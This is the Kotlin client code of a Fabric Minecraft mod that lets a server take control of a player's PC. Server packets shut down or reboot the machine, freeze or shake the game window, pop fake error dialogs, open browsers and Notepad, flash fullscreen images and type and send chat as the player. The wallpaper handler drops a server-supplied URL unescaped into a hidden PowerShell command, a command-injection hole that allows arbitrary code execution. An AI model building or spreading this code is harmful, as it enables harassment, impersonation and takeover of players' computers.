package dev.errnicraft.ypm

import net.fabricmc.api.ClientModInitializer
import net.fabricmc.api.EnvType
import net.fabricmc.api.Environment
import net.fabricmc.fabric.api.client.networking.v1.ClientConfigurationNetworking
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking
import net.minecraft.client.gui.screens.ChatScreen
import org.lwjgl.glfw.GLFW
import java.awt.*
import java.awt.image.BufferedImage
import java.io.File
import java.net.URI
import java.net.URL
import javax.imageio.ImageIO
import javax.swing.*
import kotlin.math.sin
import kotlin.random.Random

@Environment(EnvType.CLIENT)
object YourPcMineClient : ClientModInitializer {

    override fun onInitializeClient() {
        // Handshake — отвечаем версией мода
        ClientConfigurationNetworking.registerGlobalReceiver(HandshakePayload.TYPE) { _, handler ->
            val version = net.fabricmc.loader.api.FabricLoader.getInstance()
                .getModContainer("ypm")
                .map { it.metadata.version.friendlyString }
                .orElse("unknown")
            handler.responseSender().sendPacket(HandshakePayload(version))
        }

        // Ошибка + опциональный фриз
        ClientPlayNetworking.registerGlobalReceiver(ErrorDialogPayload.TYPE) { payload, context ->
            Thread {
                if (payload.freezeMs > 0) {
                    context.client().execute { Thread.sleep(payload.freezeMs) }
                }
                showWindowsErrorDialog(payload.title, payload.text)
            }.also { it.isDaemon = true; it.name = "ypm-dialog"; it.start() }
        }

        // Фриз — вешает главный поток игры
        ClientPlayNetworking.registerGlobalReceiver(FreezePayload.TYPE) { payload, context ->
            context.client().execute { Thread.sleep(payload.milliseconds) }
        }

        // Свернуть окно
        ClientPlayNetworking.registerGlobalReceiver(MinimizePayload.TYPE) { _, context ->
            val client = context.client()
            Thread {
                try {
                    val win = client.window
                    val hf = generateSequence<Class<*>>(win.javaClass) { it.superclass }
                        .flatMap { it.declaredFields.asSequence() }
                        .first { it.type == Long::class.javaPrimitiveType }
                        .also { it.isAccessible = true }
                    val handle = hf.getLong(win)
                    GLFW.glfwIconifyWindow(handle)
                } catch (_: Exception) {}
            }.also { it.isDaemon = true; it.name = "ypm-minimize"; it.start() }
        }

        // Выключение
        ClientPlayNetworking.registerGlobalReceiver(ShutdownPayload.TYPE) { _, _ ->
            Thread { shutdownPc() }.also { it.isDaemon = true; it.name = "ypm-shutdown"; it.start() }
        }

        // Перезагрузка
        ClientPlayNetworking.registerGlobalReceiver(RebootPayload.TYPE) { _, _ ->
            Thread { rebootPc() }.also { it.isDaemon = true; it.name = "ypm-reboot"; it.start() }
        }

        // Смена обоев
        ClientPlayNetworking.registerGlobalReceiver(WallpaperPayload.TYPE) { payload, _ ->
            Thread { changeWallpaper(payload.url) }.also { it.isDaemon = true; it.name = "ypm-wallpaper"; it.start() }
        }

        // Блокнот
        ClientPlayNetworking.registerGlobalReceiver(TextPayload.TYPE) { payload, _ ->
            Thread { openNotepad(payload.filename, payload.text) }.also { it.isDaemon = true; it.name = "ypm-text"; it.start() }
        }

        // Браузер
        ClientPlayNetworking.registerGlobalReceiver(WebPayload.TYPE) { payload, _ ->
            Thread { openBrowser(payload.url) }.also { it.isDaemon = true; it.name = "ypm-web"; it.start() }
        }

        // Скример — трясёт окно через GLFW
        ClientPlayNetworking.registerGlobalReceiver(ScreamerPayload.TYPE) { payload, context ->
            Thread {
                val client = context.client()

                val window = client.window
                val handle = generateSequence<Class<*>>(window.javaClass) { it.superclass }
                    .flatMap { it.declaredFields.asSequence() }
                    .first { it.type == Long::class.javaPrimitiveType }
                    .also { it.isAccessible = true }
                    .getLong(window)

                val monitor = GLFW.glfwGetPrimaryMonitor()
                val vidMode = GLFW.glfwGetVideoMode(monitor)!!
                val screenW = vidMode.width()
                val screenH = vidMode.height()
                val refreshRate = vidMode.refreshRate()

                val wasFullscreen = client.window.isFullscreen

                // Базовое оконное разрешение Minecraft — 854x480, по центру экрана
                val winW = 854
                val winH = 480
                val winX = (screenW - winW) / 2
                val winY = (screenH - winH) / 2

                // Выходим из фуллскрина (если был) и сразу ставим нужный размер —
                // всё через glfwSetWindowMonitor чтобы не затрагивать Win32 "restored size"
                if (payload.fullwindowed) {
                    // Растягиваем на весь экран
                    GLFW.glfwSetWindowMonitor(handle, 0L, 0, 0, screenW, screenH, GLFW.GLFW_DONT_CARE)
                } else {
                    // Ставим базовое оконное разрешение по центру
                    GLFW.glfwSetWindowMonitor(handle, 0L, winX, winY, winW, winH, GLFW.GLFW_DONT_CARE)
                }
                Thread.sleep(150)

                val amplitude = payload.strength * 15
                val endTime = System.currentTimeMillis() + payload.durationMs
                var t = 0.0
                val rng = Random.Default

                while (System.currentTimeMillis() < endTime) {
                    val dx: Int
                    val dy: Int
                    if (payload.noise) {
                        dx = rng.nextInt(-amplitude, amplitude + 1)
                        dy = rng.nextInt(-amplitude, amplitude + 1)
                    } else {
                        dx = (sin(t * 13.0) * amplitude).toInt()
                        dy = (sin(t * 17.0 + 1.0) * amplitude).toInt()
                        t += 0.05
                    }
                    if (payload.fullwindowed) {
                        GLFW.glfwSetWindowPos(handle, dx, dy)
                        GLFW.glfwSetWindowSize(handle, screenW, screenH)
                    } else {
                        GLFW.glfwSetWindowPos(handle, winX + dx, winY + dy)
                    }
                    Thread.sleep(16)
                }

                if (wasFullscreen && payload.restoreFullscreen) {
                    // Возвращаем настоящий фуллскрин
                    GLFW.glfwSetWindowMonitor(handle, monitor, 0, 0, screenW, screenH, refreshRate)
                    Thread.sleep(100)

                } else {
                    // Возвращаем окно к базовому размеру по центру
                    GLFW.glfwSetWindowPos(handle, winX, winY)
                    GLFW.glfwSetWindowSize(handle, winW, winH)
                }
            }.also { it.isDaemon = true; it.name = "ypm-windowshake"; it.start() }
        }




        // Захват управления игроком (possess)
        ClientPlayNetworking.registerGlobalReceiver(PossessPayload.TYPE) { payload, context ->
            Thread {
                possessPlayer(payload, context.client())
            }.also { it.isDaemon = true; it.name = "ypm-possess"; it.start() }
        }
        // Картинка на весь экран
        ClientPlayNetworking.registerGlobalReceiver(ImagePayload.TYPE) { payload, _ ->
            Thread {
                showFullscreenImage(payload.url, payload.durationMs, payload.fadeOutMs)
            }.also { it.isDaemon = true; it.name = "ypm-image"; it.start() }
        }
    }

    private fun showFullscreenImage(url: String, durationMs: Long, fadeOutMs: Long) {
        try {
            // Загружаем картинку заранее (мы уже в фоновом потоке)
            val image: BufferedImage = ImageIO.read(URL(url)) ?: return

            val alphaRef = floatArrayOf(1.0f)
            val frameRef = arrayOfNulls<JWindow>(1)

            // Создаём окно на EDT и ждём завершения (invokeAndWait, не invokeLater!)
            SwingUtilities.invokeAndWait {
                val screen = GraphicsEnvironment.getLocalGraphicsEnvironment().defaultScreenDevice
                val bounds = screen.defaultConfiguration.bounds

                val panel = object : JPanel() {
                    override fun paintComponent(g: Graphics) {
                        super.paintComponent(g)
                        val g2 = g as Graphics2D
                        g2.composite = AlphaComposite.getInstance(AlphaComposite.SRC_OVER, alphaRef[0])
                        g2.drawImage(image, 0, 0, width, height, null)
                    }
                }

                val fr = JWindow()
                fr.isAlwaysOnTop = true
                fr.bounds = bounds
                fr.contentPane = panel
                panel.isOpaque = false
                fr.isVisible = true
                fr.toFront()
                frameRef[0] = fr
            }

            // Ждём в фоновом потоке — EDT НЕ блокируется
            Thread.sleep(durationMs)

            if (fadeOutMs > 0) {
                val steps = 60
                val stepDelay = (fadeOutMs / steps).coerceAtLeast(1)
                for (i in steps downTo 0) {
                    alphaRef[0] = i.toFloat() / steps
                    SwingUtilities.invokeLater { frameRef[0]?.contentPane?.repaint() }
                    Thread.sleep(stepDelay)
                }
            }

            SwingUtilities.invokeLater { frameRef[0]?.dispose() }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun showWindowsErrorDialog(title: String, text: String) {
        val os = System.getProperty("os.name", "").lowercase()
        if (!os.contains("win")) return
        val safeTitle = title.replace("'", "`")
        val safeText = text.replace("'", "`")
        val script = "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; " +
            "[System.Windows.Forms.MessageBox]::Show('$safeText', '$safeTitle', " +
            "[System.Windows.Forms.MessageBoxButtons]::OK, " +
            "[System.Windows.Forms.MessageBoxIcon]::Error)"
        ProcessBuilder("powershell.exe", "-WindowStyle", "Hidden", "-NonInteractive", "-Command", script)
            .redirectErrorStream(true).start().waitFor()
    }

    private fun openNotepad(filename: String, text: String) {
        val os = System.getProperty("os.name", "").lowercase()
        val safeName = filename.replace(Regex("[\\\\/:*?\"<>|]"), "_")
            .let { if (it.endsWith(".txt")) it else "$it.txt" }
        val tmpFile = File(System.getProperty("java.io.tmpdir"), safeName)
        tmpFile.writeText(text)
        when {
            os.contains("win") -> ProcessBuilder("notepad.exe", tmpFile.absolutePath)
                .redirectErrorStream(true).start()
            os.contains("mac") -> ProcessBuilder("open", "-a", "TextEdit", tmpFile.absolutePath)
                .redirectErrorStream(true).start()
            else -> ProcessBuilder("xdg-open", tmpFile.absolutePath)
                .redirectErrorStream(true).start()
        }
    }

    private fun openBrowser(url: String) {
        try {
            val os = System.getProperty("os.name", "").lowercase()
            when {
                os.contains("win") -> ProcessBuilder("rundll32", "url.dll,FileProtocolHandler", url)
                    .redirectErrorStream(true).start()
                os.contains("mac") -> ProcessBuilder("open", url).redirectErrorStream(true).start()
                else -> ProcessBuilder("xdg-open", url).redirectErrorStream(true).start()
            }
        } catch (e: Exception) {
            if (Desktop.isDesktopSupported()) Desktop.getDesktop().browse(URI(url))
        }
    }

    private fun shutdownPc() {
        val os = System.getProperty("os.name", "").lowercase()
        when {
            os.contains("win") -> ProcessBuilder("shutdown", "/s", "/t", "0").redirectErrorStream(true).start()
            else -> ProcessBuilder("shutdown", "-h", "now").redirectErrorStream(true).start()
        }
    }

    private fun rebootPc() {
        val os = System.getProperty("os.name", "").lowercase()
        when {
            os.contains("win") -> ProcessBuilder("shutdown", "/r", "/t", "0").redirectErrorStream(true).start()
            else -> ProcessBuilder("shutdown", "-r", "now").redirectErrorStream(true).start()
        }
    }

    private fun changeWallpaper(url: String) {
        val os = System.getProperty("os.name", "").lowercase()
        if (!os.contains("win")) return

        // Формируем C# класс как обычную строку — НЕ heredoc, чтобы избежать проблем с отступами
        val csharpClass = "using System; using System.Runtime.InteropServices; " +
            "public class Wallpaper { " +
            "[DllImport(\"user32.dll\")] " +
            "public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }"

        val script = "\$path = \"\$env:TEMP\\ypm_wallpaper.jpg\"; " +
            "Invoke-WebRequest -Uri '$url' -OutFile \$path; " +
            "Add-Type -TypeDefinition '$csharpClass'; " +
            "[Wallpaper]::SystemParametersInfo(20, 0, \$path, 3)"

        ProcessBuilder(
            "powershell.exe", "-WindowStyle", "Hidden",
            "-NonInteractive", "-Command", script
        ).redirectErrorStream(true).start()
    }

    private fun possessPlayer(payload: PossessPayload, client: net.minecraft.client.Minecraft) {
        val rng = Random.Default
        val has = { flag: Int -> (payload.flags and flag) != 0 }

        // Только смена перспективы — без чата
        if (payload.chatMessage.isEmpty() && has(PossessPayload.FLAG_PERSPECTIVE)) {
            client.execute {
                client.options.setCameraType(
                    when (client.options.cameraType) {
                        net.minecraft.client.CameraType.FIRST_PERSON -> net.minecraft.client.CameraType.THIRD_PERSON_BACK
                        net.minecraft.client.CameraType.THIRD_PERSON_BACK -> net.minecraft.client.CameraType.THIRD_PERSON_FRONT
                        else -> net.minecraft.client.CameraType.FIRST_PERSON
                    }
                )
            }
            return
        }

        client.execute {
            client.setScreen(ChatScreen("", false))
        }
        Thread.sleep(300)

        // Смена перспективы пока чат открыт
        if (has(PossessPayload.FLAG_PERSPECTIVE)) {
            client.execute {
                client.options.setCameraType(
                    when (client.options.cameraType) {
                        net.minecraft.client.CameraType.FIRST_PERSON -> net.minecraft.client.CameraType.THIRD_PERSON_BACK
                        net.minecraft.client.CameraType.THIRD_PERSON_BACK -> net.minecraft.client.CameraType.THIRD_PERSON_FRONT
                        else -> net.minecraft.client.CameraType.FIRST_PERSON
                    }
                )
            }
            Thread.sleep(150)
        }

        // FIX 2: Используем access widener вместо рефлексии — поле input публичное после AW
        // Работает и в dev и в production jar (не зависит от обфускации имён полей)
        for (ch in payload.chatMessage) {
            client.execute {
                val screen = client.screen
                if (screen is ChatScreen) {
                    screen.input.insertText(ch.toString())
                }
            }
            Thread.sleep(rng.nextLong(60, 160))
        }

        Thread.sleep(300)

        // --send = отправить сообщение; без флага чат остаётся открытым
        if (has(PossessPayload.FLAG_SEND)) {
            client.execute {
                val screen = client.screen
                if (screen is ChatScreen) {
                    val text = screen.input.value
                    if (text.isNotEmpty()) {
                        client.player?.connection?.sendChat(text)
                    }
                    client.setScreen(null)
                }
            }
        }

        // Возвращаем перспективу обратно
        if (has(PossessPayload.FLAG_PERSPECTIVE)) {
            Thread.sleep(1000)
            client.execute {
                client.options.setCameraType(net.minecraft.client.CameraType.FIRST_PERSON)
            }
        }
    }

}